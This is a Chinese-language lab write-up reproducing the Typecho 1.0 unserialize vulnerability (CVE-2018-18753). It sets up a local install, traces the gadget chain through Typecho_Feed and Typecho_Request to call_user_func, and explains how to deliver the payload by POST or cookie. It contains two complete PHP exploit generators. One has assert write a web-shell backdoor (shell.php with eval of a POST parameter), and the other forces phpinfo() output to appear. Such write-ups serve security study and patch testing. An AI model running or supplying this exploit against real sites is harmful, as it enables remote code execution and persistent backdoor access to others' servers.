php-typecho反序列化漏洞

一.配置好环境

cve-2018-18753

https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release
这里要注意:下载的是Source code

把解压出来的文件放到phpmystudy的根目录下并且在本地数据库中创建一个名为typecho的数据库

然后去访问localhost/typecho,无脑下一步即可安装
这里的typecho是把解压出来的文件夹重命名后的结果,没有重命名的话要按实际情况来访问

二.源码分析

1.找unserialize()函数,并且函数中的值是我们可以控制的
在install.php里的230行,出现了unserialize()函数
#双击shift快速寻找
' 

<?php
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
Typecho_Cookie::delete('__typecho_config');
$db = new Typecho_Db($config['adapter'], $config['prefix']);
$db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
Typecho_Db::set($db);
?>
$db = new Typecho_Db($config['adapter'], $config['prefix']);跟踪进去看看
如果$adapterName是个类的话,这里就会自动调用__toString()函数
2.搜索__toString()函数

这里的toString有三种,一个一个去看;第一个Typecho_Feed

关注到这两行,想到了get函数的利用

__get()当访问一个类下没有的成员变量时自动调用

搜索一下__get函数

去Typecho_Request下面看看

看到调用了get,去看下get函数

get函数调用了_applyFilter()

在_applyFilter函数中,看到了call_user_func()函数

$value = is_array($value) ? array_map($filter, $value) :
                call_user_func($filter, $value);
这一句限定了$value不能为数组,因为是数组的话就不会调用call_user_func函数
3.找能利用的函数,这一部分就依靠前面的基础,
php代码执行:eval()、assert()、call_user_func_array()、preg_replace()、call_user_func()等函数
在Request.php下面发现了call_user_func()函数

总结思路:

1、通过install.php中的反序列化将adapter和prefix变量传入Typecho_Db实例化对象中

2、通过类Typecho_Db中的__construct魔术方法将adapter视作字符串拼接赋值，调用类Typecho_Feed中的__toString魔术方法

3、访问了_items['author']中的screenName属性，调用Typecho_Request类中的__get魔术方法并且传入$key=screenName

4、定义$this->_params[$key]，也就是$this->_params[‘screenName’]为我们想要执行的命令，即可赋值给$value

5、定义$this->_filter，构成回调函数，执行命令
关于call_user_func()函数的简单示例
<?php
    $b="phpinfo（）";
    call_user_func($_GET['a']，$b);
?>
当请求1.php?a=assert的时候,call_user_func函数就会把$b当成assert()的变量传进去,导致命令执行 
1.Class Typecho_Feed中的$item['author']变量应该是Typecho_Request类

2.Typecho_Request类的__get()中有个$key,可以通过外部传参获得也就是;（1）
__get()调用了get(),需要初始化一个新的变量$_params,并且是$value=_params[$key]='phpinfo'
(1)public function __get($key)
    {
        return $this->get($key);
    }
    这里的key是screenName
    因为$item['author']是Typecho_Request类，Typecho_Request类没有screenName变量,因此调用了__get()函数,并把这个没有的变量传给了__get()函数
$content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;

poc1：无回显的情况,写个后门

思路：

1.config应该是一个数组,里面两个元素
$config['adapter']=new Typecho_Feed;
$config['prefix']='typecho_';
2.因为调用了Typecho_Feed::__toString()函数,因此这个函数涉及的变量我们都得有
const RSS1 = 'RSS 1.0';
const RSS2 = 'RSS 2.0';
const ATOM1 = 'ATOM 1.0';
const DATE_RFC822 = 'r';
const DATE_W3CDTF = 'c';
const EOL = "\n";
$this->_type='RSS 2.0'#根据源码中的的else if (self::RSS2 == $this->_type)
$this->_items['author']=new Typecho_Request;#调用Typecho_Request的get函数
<?php
Class Typecho_Feed{
    private $_type;
    private $_items=array();
#为了给$_items赋值,因此用构造函数
    public function __construct()
    {
        $this->_type='RSS 2.0';
        $this->_items[0]=array(
            'author'=>new Typecho_Request()
    );
    }
}
Class Typecho_Request{
    #因为call_user_func调用的是数组,$_filter='assert'要改为$_filter[0]='assert'
    private $_filter=array();
    private $_params=array();
    public function __construct(){
        $this->_params['screenName'] = 'file_put_contents("shell.php", "<?php @eval(\$_POST[\'a\']); ?>")';    //替换phpinfo()这里进行深度利用
        $this->_filter[0] = 'assert';
    }
}
$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => 'typecho_'
);

echo base64_encode(serialize($exp));

怎么传参

回到源码,看install.php寻找传参点

通过get方式随便给finish传一个东西
追踪Typecho_Cookie::get()
要嘛在cookie里传参,要嘛用post方式传参，参数名为__typecho_config
不能两个同时用
这里就先复现POST传参

虽然没有回显,但还是命令还是执行了,生成了一个后门

poc2:回显

回显比较麻烦,因为install.php调用了ob_start()开启了缓冲区，反序列化pop链执行后phpinfo()的内容没有立刻输出，而是先存在缓冲区里。

解决的办法就是执行phpinfo()之后，让程序报错，使其提前退出

在Feed.php的292行开始

if (!empty($item['category']) && is_array($item['category'])) {
                    foreach ($item['category'] as $category) {
                        $content .= '<category><![CDATA[' . $category['name'] . ']]></category>' . self::EOL;
                    }
                }
.=的方法对象有str,boolean,int,当class类型.=字符串的时候,就会出现报错
根据分析我们得到
1.要进入这个if的条件就是$item['category']为非空数组
2.$item['category']里的某个元素应该为类
$item['category']=new xxx();
#这里的xxx随便哪个类都行,只要是源码中有的,当然不能是自己
<?php
Class Typecho_Feed{
    private $_type;
    private $_items=array();
#为了给$_items赋值,因此用构造函数
    public function __construct()
    {
        $this->_type='RSS 2.0';
        $this->_items[0]=array(
            'author'=>new Typecho_Request(),
            'category' => array(new Typecho_Request())
    );
    }
}
Class Typecho_Request{
    #因为call_user_func调用的是数组,$_filter='assert'要改为$_filter[0]='assert'
    private $_filter=array();
    private $_params=array();
    public function __construct(){
        $this->_params['screenName'] = 'phpinfo()';    //替换phpinfo()这里进行深度利用
        $this->_filter[0] = 'assert';
    }
}
$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => 'typecho_'
);

echo base64_encode(serialize($exp));
